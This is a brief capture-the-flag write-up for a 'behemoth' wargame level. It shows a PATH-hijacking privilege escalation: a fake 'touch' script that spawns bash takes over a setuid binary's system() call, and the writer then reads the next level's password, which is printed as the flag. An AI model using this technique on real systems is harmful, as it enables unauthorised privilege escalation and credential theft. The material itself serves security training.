# behemoth level3 Solution

In this challenge, we can see the code call this line in C: `system("touch $pid")`, so, we'll override the `touch` by manipulating the $PATH environment variable.

```
behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ echo "/bin/bash" > touch
behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ export PATH=$(pwd):$PATH
behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ chmod +x touch
behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ chmod +x .
behemoth2@gibson:/tmp/tmp.SzpOLaiNNy$ /behemoth/behemoth2
behemoth3@gibson:/tmp/tmp.SzpOLaiNNy$ cat /etc/behemoth_pass/behemoth3
JQ6tZGqt0i
```



**Flag:** ***`JQ6tZGqt0i`*** 
